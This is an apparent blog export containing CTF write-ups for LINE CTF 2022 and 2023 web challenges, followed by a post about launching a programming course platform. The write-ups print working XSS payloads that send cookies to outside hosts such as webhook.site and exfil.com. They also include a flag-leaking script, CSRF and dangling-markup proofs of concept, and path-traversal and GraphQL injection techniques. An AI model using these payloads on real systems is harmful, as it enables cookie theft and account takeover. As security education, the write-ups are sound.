NodeJS.ErrnoException, fd: any): void => &#123; if (err || typeof fd !== \"number\") &#123; res.end(\"Invalid argument.\") &#125; else &#123; let buf: Buffer = Buffer.alloc(e - s); Fs.read(fd, buf, 0, (e - s), s, (err: NodeJS.ErrnoException, bytesRead: number, buf: Buffer): void => &#123; res.end(`&lt;h1>$&#123;t&#125;&lt;/h1>&lt;hr/>` + buf.toString(\"utf-8\")) &#125;) &#125; &#125;) &#125; &#125; else &#123; res.end(\"There isn't size of book.\") &#125; &#125; &#125;) &#125; &#125;); Put /%2e%2e%2f/0/12345 in the path, and you can perform path traversal and read any file, but the question is which file to read. With the help of teammates, we read /proc/self/mem, which is the memory of the current node process. As for which segment to read, you have to look it up from /proc/self/maps. Then, because an endpoint will put the parameters into memory, you can use that endpoint to put your payload first, and then because this problem gives an offset when reading the file, you can find the payload in memory and set the offset, and then send it to the bot for XSS. However, according to post-match discussions, it seems that because the flag is in the cookie, when the bot sends a request to the server, the flag will also appear in the memory, so you can directly read the memory to find the flag without using XSS. Haribote Secure Note(7 solves)This problem took a whole day to solve, but still couldn’t solve it, so sad QQ You can set a nickname, up to 16 characters, and then add notes with a title and content. The key code for displaying notes is here: &lt;script nonce=\"&#123;&#123; csp_nonce &#125;&#125;\"> const printInfo = () => &#123; const sharedUserId = \"&#123;&#123; shared_user_id &#125;&#125;\"; const sharedUserName = \"&#123;&#123; shared_user_name &#125;&#125;\"; // 省略 &#125; const printInfoBtn = document.getElementById('printInfoBtn'); printInfoBtn.addEventListener('click', printInfo); &lt;/script> And this part near the end: &lt;script nonce=\"&#123;&#123; csp_nonce &#125;&#125;\"> const render = notes => &#123; // 省略 &#125;; render(&#123;&#123; notes &#125;&#125;) &lt;/script> The former gives us 16 characters of JS injection, and the latter can use &lt;/script&gt; to escape the tag, which is HTML injection. The difficulty of this problem lies in the fact that the CSP is very strict: &lt;meta content=\"default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;' 'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default\" http-equiv=\"Content-Security-Policy\"> Because there is a nonce, unsafe-inline does not work, and unsafe-eval is not enabled, so there is no way to dynamically execute code. At the time, after struggling for a long time, I had an idea that we could use HTML injection to insert a form &lt;form id=&quot;f&quot;&gt;, and then CSRF admin to change the admin’s nickname, because the other page profile has no CSP and can also be injected: &lt;input name=\"display_name\" type=\"text\" class=\"form-control form-control-sm\" id=\"inputUserDisplayName\" value=\"&#123;&#123; current_user.display_name &#125;&#125;\"> The nickname part can be set to &quot;;f.submit();&quot; or similar, to submit the form. After changing it, visit the profile page and execute XSS on that page. But the biggest problem is that &quot;onfocus=eval(name) has 20 characters, which exceeds the limit and cannot be successful (and you also need to think about how to set the name). After the competition, I looked at other people’s solutions, mainly three types. The first one comes from Super HexaGoN, which uses a magical script data double escaped state to comment out everything between the two injection points, and then execute the code in a script with a nonce. I had never seen this before, so I’ll have to study it later. display name: &lt;!--&lt;script&gt;&quot;&#125;&#x2F;* title: --&gt; &#x2F;* content: *&#x2F; location.href&#x3D;&#39;(attacker)&#x2F;c&#x3D;&#39;+document.cookie The second one uses the feature that import is not blocked by Trusted Types, and the payload below comes from maple3142: display name: \"+import(y)+\" title: &lt;/script>&lt;a id=x href=\"//SERVER\">&lt;/a> content: &lt;a id=y href=\"data:text/javascript,open(x+`?`+document.cookie);alert()\">&lt;/a> The third one uses an iframe to execute code on other pages (from eskildsen#8025): name: &quot;;f.eval(p+&quot;&quot;);&quot; title: &lt;&#x2F;script&gt;&lt;iframe src&#x3D;&quot;&#x2F;p&quot; name&#x3D;f&gt;&lt;&#x2F;iframe&gt; content: &lt;a href&#x3D;&quot;javascript:window.top.location&#x3D;&#39;http:&#x2F;&#x2F;exfil.com&#x2F;&#39;+btoa(this.parent.document.cookie)&quot; id&#x3D;p name&#x3D;p&gt;payload&lt;&#x2F;a&gt; The third one is the only one I think I might have thought of, because I didn’t know the other two. By the way, &quot;;f.eval(p+&quot;&quot;);&quot; and &lt;!--&lt;script&gt;&quot;&#125;/* both happen to be 16 characters long, so I guess one of them is an unexpected solution, which is the fun of CTF XD. And this question is really interesting and worth learning, as all three solutions are completely different. Oh, by the way, maple3142’s writeup solved a puzzle for me, which is why the templates for this question are not escaped. It turns out that Flask defaults to only escaping HTML&#x2F;XML&#x2F;XHTML, which is why I didn’t see any settings. title todo(6 solves)This question is basically a website for uploading pictures. After uploading, you will get a URL, and then you can create a new post with the title and image URL. The flag is placed in the footer of the webpage when visited with admin privileges, and has a strange format: LINECTF&#123;([0-9a-f]/)&#123;10&#125;&#125;. Then there is a place on the page that is not enclosed in double quotes: &lt;img src=&#123;&#123; image.url &#125;&#125; class=\"mb-3\"> Although it looks like a small detail, the entire solution actually stems from this. From here, it is easy to see that we can control any attribute of the img, but I was stuck here for a while, thinking that if we can control it, what’s the point? We can’t XSS if we can’t get out of the img. Then, after being reminded by my teammate, I thought of the xsleak of STTF, which detects scrolling behavior through the lazy loading of images. Therefore, as long as the title is very long, the img is pushed down, and the loading=lazy attribute is added, it can be used with STTF to leak one byte. However, there is one thing to note about this question, which is CSP: default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39; blob: CSP cannot be bypassed, so even if src is controllable, external images cannot be set. Therefore, this question has added another mechanism: cache, which can determine whether the cache of an image is a miss or a hit based on the response header. Therefore, we only need to upload a new image and give it to the bot, and then check its response header after a few seconds. If it is a hit, it means that the bot has accessed the image, which means that SSTF has succeeded. Just write an exploit based on this concept: import requests import json import time from time import sleep base_url = 'http://35.187.204.223' cookie = \"session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8\" def upload_image(): files = &#123;'img_file': open('a.png','rb')&#125; resp = requests.post(base_url + '/image/upload', files=files, headers=&#123; \"Cookie\": cookie &#125;) return json.loads(resp.text) def create_post(url): resp = requests.post(base_url + '/image', data=&#123; \"title\": str(time.time()) + \"w\"*5000, \"img_url\": f\"/static/image/111 srcset=&#123;url&#125; loading=lazy \" &#125;, headers=&#123; \"Cookie\": cookie &#125;, allow_redirects=False) return resp.headers[\"X-ImageId\"] def share(url, keyword): resp = requests.post(base_url + '/share', json=&#123; \"path\": \"image/\" + url + \"#:~:text=\" + keyword, &#125;, headers=&#123; \"Cookie\": cookie &#125;) return resp.text def check_cached(img_url): resp = requests.get(base_url + img_url, headers=&#123; \"Cookie\": cookie &#125;, allow_redirects=False) return resp.headers[\"X-Cache-Status\"] def run(): known = \"LINECTF&#123;\" while True: for char in \"0123456789abcdef\": print(\"trying:\" + known+char) resp = upload_image() img_url = resp[\"img_url\"] print(\"img url:\" + img_url) img_id = create_post(img_url) print(\"img id:\" + img_id) share_res = share(img_id, known + char) print(\"resp:\" + share_res) sleep(3) cache_resp = check_cached(img_url) print(\"cached:\" + cache_resp) if cache_resp == \"HIT\": known += char + \"/\" print(known) break run() In addition, maple3142’s writeup solved a confusion for me, which is why the flag needs those /? It turns out that Chromium, in order to avoid this kind of xsleak, must match the entire word when judging SSTF in order to scroll. For example, if there is this string on the page: Hello world, your text fragment specifies He, it will not work, it must be Hello, which is why this question uses / to separate, because if it is not separated, it will not be possible to leak one word at a time. me7-ball(2 solves)This question seems to be more related to crypto, so I didn’t look at it carefully and directly posted Super HexaGoN’s writeup: https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682","link":"/2022/03/27/en/linectf-2022-writeup/"},{"title":"LINE CTF 2023 Notes","text":"This year, Water Paddler got second place, solving 8 out of 9 web challenges (I contributed to 2 of them). Overall, I think the web challenges were easier than last year, and there were fewer participants. Recently, I noticed that I haven’t been writing as many writeups as before. One reason is that I’ve been busy, and the other reason is that there haven’t been as many interesting challenges (client-side) lately. Or maybe my teammates have become stronger, and they solve the challenges before I even get a chance to look at them. So, I’ve been too lazy to write notes XD In this post, I’ll only write about the challenges that I participated in or found interesting. I’ll skip the others. Flag Masker (9 solves)The backend code for this challenge was simple. It allowed you to create a note, and the output was secure, with no risk of XSS. The interesting part was that an admin bot had an extension that had obfuscated code, but fortunately, it was short. Here’s the worker.js code: (() => &#123; \"use strict\"; (() => &#123; console.log(\"Flag Master - worker script is loaded.\"); var e = function(e, n) &#123; return n.replace(e, (function(e, r, a) &#123; n = n.replace(new RegExp(r, \"g\"), \"*\".repeat(r.length)), n += \"\\x3c!--DETECTED FLAGS ARE MASKED BY EXTENSION--\\x3e\" &#125;)), n &#125;; chrome.runtime.onMessage.addListener((function(n, r, a) &#123; var t = n.regex ? new RegExp(n.regex, \"g\") : new RegExp(\"LINECTF\\\\&#123;(.+)\\\\&#125;\", \"g\"); ! function(e, n) &#123; var r = n.head, a = n.body; return e.test(r + a) &#125;(t, n) ? a(&#123; head: null, body: null, flag: !1 &#125;): a(&#123; head: e(t, n.head), body: e(t, n.body), flag: !0 &#125;) &#125;)) &#125;)() &#125;)(); After receiving a message, it replaces the content on the screen based on the received regular expression and then sends it back. Here’s the content.js code: (() => &#123; var t = &#123; 576: (t, r, e) => &#123; var a, n; void 0 === (n = \"function\" == typeof(a = function() &#123; var t = &#123; a: \"href\", img: \"src\", form: \"action\", base: \"href\", script: \"src\", iframe: \"src\", link: \"href\", embed: \"src\", object: \"data\" &#125;, r = [\"source\", \"protocol\", \"authority\", \"userInfo\", \"user\", \"password\", \"host\", \"port\", \"relative\", \"path\", \"directory\", \"file\", \"query\", \"fragment\"], e = &#123; anchor: \"fragment\" &#125;, a = &#123; strict: /^(?:([^:\\/?#]+):)?(?:\\/\\/((?:(([^:@]*):?([^:@]*))?@)?([^:\\/?#]*)(?::(\\d*))?))?((((?:[^?#\\/]*\\/)*)([^?#]*))(?:\\?([^#]*))?(?:#(.*))?)/, loose: /^(?:(?![^:@]+:[^:@\\/]*@)([^:\\/?#.]+):)?(?:\\/\\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\\/?#]*)(?::(\\d*))?)(((\\/(?:[^?#](?![^?#\\/]*\\.[^?#\\/.]+(?:[?#]|$)))*\\/?)?([^?#\\/]*))(?:\\?([^#]*))?(?:#(.*))?)/ &#125;, n = /^[0-9]+$/; function o(t, e) &#123; for (var n = decodeURI(t), o = a[e ? \"strict\" : \"loose\"].exec(n), i = &#123; attr: &#123;&#125;, param: &#123;&#125;, seg: &#123;&#125; &#125;, s = 14; s--;) i.attr[r[s]] = o[s] || \"\"; return i.param.query = f(i.attr.query), i.param.fragment = f(i.attr.fragment), i.seg.path = i.attr.path.replace(/^\\/+|\\/+$/g, \"\").split(\"/\"), i.seg.fragment = i.attr.fragment.replace(/^\\/+|\\/+$/g, \"\").split(\"/\"), i.attr.base = i.attr.host ? (i.attr.protocol ? i.attr.protocol + \"://\" + i.attr.host : i.attr.host) + (i.attr.port ? \":\" + i.attr.port : \"\") : \"\", i &#125; function i(t, r) &#123; if (0 === t[r].length) return t[r] = &#123;&#125;; var e = &#123;&#125;; for (var a in t[r]) e[a] = t[r][a]; return t[r] = e, e &#125; function s(t, r, e, a) &#123; var o = t.shift(); if (o) &#123; var u = r[e] = r[e] || []; \"]\" == o ? c(u) ? \"\" !== a &amp;&amp; u.push(a) : \"object\" == typeof u ? u[function(t) &#123; var r = []; for (var e in t) t.hasOwnProperty(e) &amp;&amp; r.push(e); return r &#125;(u).length] = a : u = r[e] = [r[e], a] : ~o.indexOf(\"]\") ? (o = o.substr(0, o.length - 1), !n.test(o) &amp;&amp; c(u) &amp;&amp; (u = i(r, e)), s(t, u, o, a)) : (!n.test(o) &amp;&amp; c(u) &amp;&amp; (u = i(r, e)), s(t, u, o, a)) &#125; else c(r[e]) ? r[e].push(a) : \"object\" == typeof r[e] || void 0 === r[e] ? r[e] = a : r[e] = [r[e], a] &#125; function u(t, r, e) &#123; if (~r.indexOf(\"]\")) s(r.split(\"[\"), t, \"base\", e); else &#123; if (!n.test(r) &amp;&amp; c(t.base)) &#123; var a = &#123;&#125;; for (var o in t.base) a[o] = t.base[o]; t.base = a &#125; \"\" !== r &amp;&amp; function(t, r, e) &#123; var a = t[r]; void 0 === a ? t[r] = e : c(a) ? a.push(e) : t[r] = [a, e] &#125;(t.base, r, e) &#125; return t &#125; function f(t) &#123; return function(t, r) &#123; for (var e = 0, a = t.length >> 0, n = arguments[2]; e &lt; a;) e in t &amp;&amp; (n = r.call(void 0, n, t[e], e, t)), ++e; return n &#125;(String(t).split(/&amp;|;/), (function(t, r) &#123; try &#123; r = decodeURIComponent(r.replace(/\\+/g, \" \")) &#125; catch (t) &#123;&#125; var e = r.indexOf(\"=\"), a = function(t) &#123; for (var r, e, a = t.length, n = 0; n &lt; a; ++n) if (\"]\" == (e = t[n]) &amp;&amp; (r = !1), \"[\" == e &amp;&amp; (r = !0), \"=\" == e &amp;&amp; !r) return n &#125;(r), n = r.substr(0, a || e), o = r.substr(a || e, r.length); return o = o.substr(o.indexOf(\"=\") + 1, o.length), \"\" === n &amp;&amp; (n = r, o = \"\"), u(t, n, o) &#125;), &#123; base: &#123;&#125; &#125;).base &#125; function c(t) &#123; return \"[object Array]\" === Object.prototype.toString.call(t) &#125; function d(t, r) &#123; return 1 === arguments.length &amp;&amp; !0 === t &amp;&amp; (r = !0, t = void 0), r = r || !1, &#123; data: o(t = t || window.location.toString(), r), attr: function(t) &#123; return void 0 !== (t = e[t] || t) ? this.data.attr[t] : this.data.attr &#125;, param: function(t) &#123; return void 0 !== t ? this.data.param.query[t] : this.data.param.query &#125;, fparam: function(t) &#123; return void 0 !== t ? this.data.param.fragment[t] : this.data.param.fragment &#125;, segment: function(t) &#123; return void 0 === t ? this.data.seg.path : (t = t &lt; 0 ? this.data.seg.path.length + t : t - 1, this.data.seg.path[t]) &#125;, fsegment: function(t) &#123; return void 0 === t ? this.data.seg.fragment : (t = t &lt; 0 ? this.data.seg.fragment.length + t : t - 1, this.data.seg.fragment[t]) &#125; &#125; &#125; return d.jQuery = function(r) &#123; null != r &amp;&amp; (r.fn.url = function(e) &#123; var a, n, o = \"\"; return this.length &amp;&amp; (o = r(this).attr((a = this[0], void 0 !== (n = a.tagName) ? t[n.toLowerCase()] : n)) || \"\"), d(o, e) &#125;, r.url = d) &#125;, d.jQuery(window.jQuery), d &#125;) ? a.call(r, e, r, t) : a) || (t.exports = n) &#125;, 144: function(t, r, e) &#123; \"use strict\"; var a = this &amp;&amp; this.__importDefault || function(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125;; Object.defineProperty(r, \"__esModule\", &#123; value: !0 &#125;); var n, o, i = a(e(576)); console.log(\"Flag Masker - content script is loaded.\"), n = (0, i.default)(location.href), o = &#123;&#125;, localStorage.config ? o = JSON.parse(localStorage.config) : fetch(\"/config\").then((function(t) &#123; return t.json() &#125;)).then((function(t) &#123; localStorage.setItem(\"config\", JSON.stringify(t)), o = t &#125;)), chrome.runtime.sendMessage(&#123; regex: o.regex, head: window.document.head.innerHTML, body: window.document.body.innerHTML &#125;).then((function(t) &#123; t.flag &amp;&amp; (window.document.head.innerHTML = t.head, window.document.body.innerHTML = t.body, fetch(n.data.attr.path + \"/alert\", &#123; referrerPolicy: \"unsafe-url\" &#125;)) &#125;)) &#125; &#125;, r = &#123;&#125;; ! function e(a) &#123; var n = r[a]; if (void 0 !== n) return n.exports; var o = r[a] = &#123; exports: &#123;&#125; &#125;; return t[a].call(o.exports, o, o.exports, e), o.exports &#125;(144) &#125;)(); This code is a bit longer, but it basically reads the config first, then sends the content of the body and head to the worker to replace. After replacing, it puts the content back on the screen and reports the matching content to the location n.data.attr.path + /alert. If you search for the long code above, you’ll find that it comes from the Purl library, which has been abandoned for a long time. Apart from having a prototype pollution problem, it also has many vulnerabilities in parsing URLs. First, let’s talk about prototype pollution. We can control the localStorage.config property by polluting the config, and pass in the regular expression we want. I initially thought of creating a ReDos or something similar and then detecting the time, but later I found out that n.data.attr.path can also be controlled. For example, the path of the URL http://web:8000/#@acabc//8cae-ip.ngrok.io will be parsed as //8cae-ip.ngrok.io, so we can send the request to our server. Combined with the config mentioned earlier, we can know which regular expression has a match. &lt;script> const domain = '8cae.ngrok.io' const base = 'http://' + domain function getUrl(flag) &#123; return `http://web:8000/#@acabc//$&#123;domain&#125;/$&#123;flag&#125;?q[__proto__][config]=&#123;\"regex\":\"$&#123;flag&#125;\"&#125;` &#125; function report(msg) &#123; fetch(base + '?msg=' + msg) &#125; function visit(str) &#123; var w = window.open(getUrl(str)) setTimeout(() => &#123; w.close() &#125;, 2000) &#125; let flag = 'LINECTF&#123;' const charset = '0123456789abcdef' const sleep = ms => new Promise(r => setTimeout(r, ms)) async function main() &#123; for(let i=0; i&lt;32; i++) &#123; for(let c of charset) &#123; const str = flag + \".\".repeat(i) + c visit(str) await sleep(100) &#125; &#125; &#125; main() &lt;/script> Apart from this solution, another more powerful one is to directly create an XSS using the original functionality. The structure of each note is as follows: &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>&#123;content&#125;&lt;/p> &lt;/div> &lt;/li> Suppose I create two notes. The first one has the content &quot; id=a x=&quot;, and the second one has LINECTF&#123;rotate-1 yellow-bg&quot;&#125;. The HTML content will become: &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>\" id=a x=\"&lt;/p> &lt;/div> &lt;/li> &lt;li> &lt;div class=\"rotate-1 yellow-bg\"> &lt;p>LINECTF&#123;rotate-1 yellow-bg\"&#125;&lt;/p> &lt;/div> &lt;/li> Actually, &quot; will also be encoded on the backend, so if you look at the source, you’ll see &amp;#34;. But if you use document.body.innerHTML, the browser may not encode it, so you’ll see double quotes instead of &amp;#34;. So, the encoding of double quotes doesn’t work. Then, the extension intervenes and replaces rotate-1 yellow-bg&quot; with something like ***, resulting in: &lt;li> &lt;div class=\"xxx> &lt;p>\" id=a x=\"&lt;/p> &lt;/div> &lt;/li> &lt;li> &lt;div class=\"xxx> &lt;p>LINECTF&#123;xxx&#125;&lt;/p> &lt;/div> &lt;/li> Adjusting the new structure a bit: &lt;li> &lt;div class=\"xxx>&lt;p>\" id=a x=\"&lt;/p>&lt;/div>&lt;/li>&lt;li>&lt;div class=\" xxx> &lt;p>LINECTF&#123;xxx&#125;&lt;/p> &lt;/div> &lt;/li> The first double quote is replaced, combined with the double quote at the beginning of the original content, and the x=&quot; at the end is combined with the next one. The id=a in the middle becomes part of the attribute. In other words, we can insert any attribute into the div and use the focus function to create an XSS. Here’s the payload that Renwa gave me in Discord: note 1: &quot;tabindex&#x3D;&quot;1&quot;onfocus&#x3D;&quot;eval(window.name)&quot;style&#x3D;&quot;position:relative;height: 20000px; width: 20008px;&quot;autofocus&#x3D;&quot;1&quot;id&#x3D;&quot;jj&quot;x&#x3D;&quot; note 2: LINECTF&#123;rotate-1 yellow-bg&quot;&#125; Report: @domain.wtf&#x2F;0ff.html Contents of 0ff.html: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;img src&#x3D;http:&#x2F;&#x2F;httpstat.us&#x2F;200?sleep&#x3D;5000&gt; &lt;script&gt; var x&#x3D; window.open(&#39;http:&#x2F;&#x2F;web:3000&#x2F;8be526fd-e193-436c-a431-84141a0903b9&#39;,&#39;fetch(&#96;http:&#x2F;&#x2F;web:8000&#x2F;&#96;,&#123;credentials: &quot;same-origin&quot;&#125;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&#96;https:&#x2F;&#x2F;webhook.site&#x2F;603ab026-5a65-432f-a894-5d981fd24198?flag&#x3D;$&#123;btoa(x)&#125;&#96;))&#39;); setTimeout(function()&#123; x.location&#x3D;&#39;http:&#x2F;&#x2F;web:8000&#x2F;8be526fd-e193-436c-a431-84141a0903b9#jj&#39; &#125;,500) &lt;&#x2F;script&gt; &lt;&#x2F;html&gt; I didn’t think of this solution at the time. It’s really amazing. Another Secure Store Note (7 solves)This challenge had a feature to change the name, and the name would be directly reflected on the screen, creating a free XSS. However, the problem was that changing the name required checking the CSRF token. There was a file called getSettings.js that had the CSRF token: function isInWindowContext() &#123; const tmp = self; self = 1; // magic const res = (this !== self); self = tmp; return res; &#125; // Ensure it is in window context with correct domain only :) // Setting up variables and UI if (isInWindowContext() &amp;&amp; document.domain === '&lt;%= domain %>') &#123; const urlParams = new URLSearchParams(location.search); try &#123; document.getElementById('error').innerText = urlParams.get('error'); &#125; catch (e) &#123;&#125; try &#123; document.getElementById('message').innerText = urlParams.get('message'); &#125; catch (e) &#123;&#125; try &#123; document.getElementById('_csrf').value = '&lt;%= csrf %>'; &#125; catch (e) &#123;&#125; &#125; Here, it checks whether it is in the window context and document.domain. When I saw this, I immediately thought of the Intigriti XSS challenge in October 2022. The author’s writeup is here: https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md One part of the challenge uses a web worker to bypass the check on window.location.href and document.domain, like this: // worker.js window = &#123;&#125; window.location = &#123;&#125; document = &#123;&#125; // send the secret to top window! window.saveSecret = function(msg)&#123; self.postMessage(msg) &#125; window.location.href = \"https://challenge-1022.intigriti.io/challenge/create\"; document.domain = \"challenge-1022.intigriti.io\"; // we can use importScripts function from API to import external scripts! importScripts(\"https://challenge-1022.intigriti.io/challenge/getSecret.js\"); So this challenge specifically checks the context to try to block this, but fortunately when I was researching Intigriti, I found that document.domain can actually be overridden using Object.defineProperty, so CSRF can be done like this: &lt;script> Object.defineProperty(document, 'domain', &#123; value: '35.200.57.143' &#125;) &lt;/script> &lt;input id=\"_csrf\" /> &lt;script src=\"https://35.200.57.143:11004/getSettings.js\">&lt;/script> &lt;form id=f method=POST action=\"https://35.200.57.143:11004/profile\" target=\"_blank\"> &lt;input name=\"name\" value=\"poc\"> &lt;input name=\"csrf\" value=\"\"> &lt;/form> &lt;script> const csrf = _csrf.value f.csrf.value = csrf f.submit() &lt;/script> Next is to steal the nonce. This challenge uses Firefox, and it doesn’t seem to have much protection against Dangling Markup Injection, which can be used to steal the following content using meta redirect: &lt;meta http-equiv=refresh content=&#39;0; url=http://43d1-ip.ngrok.io/steal?q= The final step is to prevent the loading of csp.gif, because if this is loaded, the nonce will change. I spent an hour and a half trying to figure out how to block it, and originally thought that the previously mentioned concurrent limit could be used to prevent it, but no matter how I tried, it didn’t work. Finally, I found that the original base-uri was self, so the base could be used, wasting an hour QQ Momomomomemomemo (3 solves)This challenge was solved by my teammate and is quite interesting. Basically, the frontend will use GraphQL to fetch results based on the id you provide: memo(id) &#123; const query = `query &#123; memo ( id: \"$&#123;id&#125;\", token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125;`; return this.#query(query); &#125; In the final query part, persisted queries are used. Basically, you send the hash of the query first, and if it has been executed before, the result will be sent back directly. Otherwise, if it hasn’t, you send the hash + query again, and the backend caches the result. The frontend implementation is like this: async #query(query) &#123; const hash = await this.#getQueryHash(query); const res = await fetch( this.endpoint + \"?\" + new URLSearchParams(&#123; extensions: JSON.stringify(&#123; persistedQuery: &#123; version: 1, sha256Hash: hash &#125;, &#125;), &#125;), &#123; headers: &#123; \"Content-type\": \"application/json\" &#125;, &#125; ); const data = await res.clone().json(); if (data.errors) &#123; if (data.errors[0].extensions.code == \"PERSISTED_QUERY_NOT_FOUND\") &#123; return await fetch(this.endpoint, &#123; method: \"POST\", headers: &#123; \"Content-type\": \"application/json\" &#125;, body: JSON.stringify(&#123; query, extensions: &#123; persistedQuery: &#123; version: 1, sha256Hash: hash, &#125;, &#125;, &#125;), &#125;); &#125; &#125; return res; &#125; The frontend also uses the Purl library, so there is also prototype pollution that can be used, but what can be polluted in this challenge? The answer is in this section: const purl = window.purl const memoId = purl().param('id') const gql = new GraphQL(location.origin) class GraphQL &#123; constructor(host, option = &#123;&#125;) &#123; this.endpoint = host + \"/\"; this.endpoint += option.path || \"graphql\"; &#125; // ... &#125; You can pollute the path, which can manipulate option.path, but what can be done with this? This is related to the backend’s i18n logic, implemented as follows: // simple i18n app.use(function (req, res, next) &#123; let origPath = req.originalUrl.split('?')[0] let origParam = req.originalUrl.split('?')[1] let langPath = 'en/' if (origPath.match(/((\\/en\\/?)|(\\/ja\\/?))$/) || origPath.match(/^(\\/static\\/|\\/graphql\\/?|\\/favicon.ico\\/?)/)) &#123; next() &#125; else &#123; if (req.headers['accept-language'] &amp;&amp; req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/' res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : '')) &#125; &#125;) Note that req.originalUrl will only have the path part, so if it’s like http://chall:11005/abc, the originalUrl will be /abc. With the path manipulated above, we can pollute the path to /huli.tw/, so the sent URL will be: http://34.85.126.119:11005//huli.tw/?extensions=..., and in the backend’s redirect logic, it will finally be redirected to //huli.tw/en/?extension=.... This way, by using prototype pollution, the request can be redirected to our own server and the query string can be obtained. The goal of this challenge is to steal the admin’s memo, but we don’t know the admin memo id. What should we do? Take a closer look at this section: memo(id) &#123; const query = `query &#123; memo ( id: \"$&#123;id&#125;\", token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125;`; return this.#query(query); &#125; We can carefully construct an id to achieve GraphQL injection, like this: query &#123; memo ( id: \"a\", token: \"b\" ) &#123; content &#125; memo2: memos( token: \"$&#123;this.token&#125;\") &#123; content &#125; &#125; This turns into two queries. The original memo token becomes the memos token, allowing access to all admin notes. Therefore, the final solution is to send this modified query once to let the server store the result, then add prototype pollution to redirect the request to our server. This way, we can find out the hash and obtain the result.","link":"/2023/03/27/en/linectf-2023-writeup/"},{"title":"Lidemy Lithium Academy: An Online Programming Course Platform for Beginners","text":"IntroductionRecently, I have just finished building the Lidemy Lithium Academy, an online programming course platform. Currently, the website is built on Teachable, a service that allows for quick and easy creation of course platforms. In this post, I will discuss the background and philosophy behind Lidemy. OriginI have always been someone who enjoys teaching. From the physical courses I taught at my previous company, to the free programming tutorials I offered in Taipei, to the Introduction to Computer Science and Coding Magic for Beginners course I taught on Hahow, and most recently, the Frontend Intermediate Course. You can read about my personal journey in full in My Programming Experience. Perhaps it is because of my diverse background that I have an advantage in teaching. Often, I can explain things in a way that is easier to understand and more accessible to my students. Most of the courses I have taught have been free, both online and offline. The only paid course I offered was made free after the contract expired. The goal of all my courses has been the same: to help beginners enter the field of programming more smoothly. I have always believed that teaching is a two-way street. Not only is giving instruction a two-way process, but the act of teaching itself is also a two-way process. In the process of teaching, the teacher is also a student, and the student is also a teacher. Both can learn something from each other. I often see many beginners who think that programming is difficult and that they are too stupid to learn it, or they buy a course and find that they cannot understand what the teacher is saying. I want to tell you that this is not your fault, but rather the fault of the teacher who can teach better. I have always held myself to this standard. If a student cannot understand or learn, it is not their fault, it is mine. It is because I did not use simpler examples to help them understand, or did not design the course better or more suitable for beginners. In addition to online courses, I have also written many articles related to beginners on my blog, such as Novice Programming Frequently Asked Questions (FAQ) Articles, Why You Should Start from Scratch to Learning Program, Experience: Ten Years of Programming Self-Study Road, Programming Course Like Ocean: CS50, and more. In fact, I have always wanted to create my own online course platform. Before teaching on Hahow, I had already thought about it, and I had also thought about offering physical courses, but I never took action because I felt that my resources were not enough and that I needed more time to accumulate them. Recently, one day, I wanted to search for an article using keywords such as “programming self-study,” “programming teaching,” and “programming introduction.” I found that the top three search results were my articles, and at the same time, I was teaching the Frontend Intermediate Course. I realized that I had taught many times and written many articles, and it seemed like it was time to organize my resources. Therefore, Lidemy Lithium Academy was born. Why is it called Lidemy?Previously, someone wrote to me asking for cooperation and permission to repost an article on their blog, and requested a photo of a logo. At that time, I didn’t know what to put in the logo. I had been running this for so long and still didn’t have a logo. Later, I talked to a friend and he suggested using the image of my cup. I bought this cup from Mr. Sai’s Science Factory. The moment I saw it, I decided to buy it. Li happens to be one of the characters in my name and also the name of a chemical element. Later, when I had to name this new online programming course platform, I immediately thought of this character and logo. I even thought of the Chinese name, “Lithium Academy,” which sounds like “Science Academy.” Although programming is more like what an electrical and computer engineering school would do, it seems to be somewhat related to “science.” Therefore, I quickly decided on the logo and Chinese name, and then only the English name was left. I thought of the English name directly from the Chinese name. I checked the translation of “academy” and found that it could be called “college” or “faculty,” but I didn’t think they were suitable. I thought of Li Bootcamp or Li School, but they sounded a bit strange. One day, I accidentally discovered that “Academy” also means “school,” so I decided on “Li Academy!” After deciding, I immediately registered the domain name online and found that liacademy.com had already been taken, so I could only use liacademy.tw. However, I found that there was also the super powerful domain name li.academy that could be applied for, but it cost more than 6,000 Taiwanese dollars a year, more than ten times the cost of other domains. At that time, I thought for a long time, should I really buy this domain name? And I’m not sure if only real educational institutions can purchase this domain name (I don’t think so, I’m just worried). In the process of thinking, I suddenly thought of combining these two words to become Lidemy. The advantage of this name is that it is easier to pronounce and the domain name is still available. I asked my roommate about it, and he said, “But doesn’t it make people feel like it’s similar to Udemy?” Yes, that’s right, and Udemy’s logo is also a U, which feels quite similar. Later, because I couldn’t decide, I posted these two options on Facebook and let my friends vote, and Lidemy won overwhelmingly. This is the story of how the name Lidemy was born. Lidemy’s PhilosophyAfter deciding on the name and logo, the next big thing was the slogan. Almost every website has a slogan, a short sentence that explains what they are doing. We can refer to others: Hahow: The most interesting online course platform ALPHA Camp: Cultivating talents that global startups crave Hex School: Take you to learn online courses that you can do Udemy: Learn Anything, On Your Schedule I remember that the first thing I thought of was: an online programming course platform specifically designed for beginners. I also thought of other things, such as an honest online programming course platform, committed to being the most honest online programming course platform, and so on. In short, the term “Online Programming Course Platform” is fixed, and it depends on what comes before it. In the end, the words above are too 